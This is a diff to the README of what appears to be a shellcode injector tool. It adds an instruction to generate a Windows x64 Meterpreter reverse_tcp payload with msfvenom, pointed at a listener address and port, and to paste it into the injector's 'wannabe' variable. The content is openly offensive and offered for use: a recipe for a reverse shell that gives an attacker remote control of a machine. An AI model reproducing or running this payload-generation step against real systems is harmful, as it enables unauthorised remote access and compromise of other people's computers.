@@ -1,5 +1,6 @@
 # Shellcode Injector
 ### instructions
+Gen your msfvenom shellcode : `msfvenom -platform windows --arch x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=4444 -f c --var-name=wannabe`
 Put your shellcode in the `wannabe` variable.
 
 ### Warning
